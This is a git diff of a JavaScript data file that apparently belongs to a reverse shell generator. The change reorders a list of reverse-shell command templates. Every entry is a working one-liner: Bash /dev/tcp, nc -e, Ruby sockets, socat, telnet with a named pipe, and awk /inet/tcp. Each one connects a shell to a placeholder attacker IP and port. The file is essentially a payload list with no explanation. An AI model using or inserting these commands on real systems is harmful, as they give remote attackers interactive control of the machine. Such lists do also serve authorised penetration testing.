@@ -10,6 +10,7 @@ const rsgData = {
     shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
 
     reverseShellsCommands: [
+        ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
         ['Bash #1', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
         ['Bash #2', '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'],
         ['nc #1', 'nc -e /bin/{shell} {ip} {port}'],
@@ -29,8 +30,7 @@ const rsgData = {
         ['Ruby #2', 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''],
         ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
         ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
-        ['telnet', 'mknod a p && telnet {ip} {port} 0&#60;a | /bin/{shell} 1&#62;a'],
-        ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null']
+        ['telnet', 'mknod a p && telnet {ip} {port} 0&#60;a | /bin/{shell} 1&#62;a']
     ],
 
     specialCommands: {
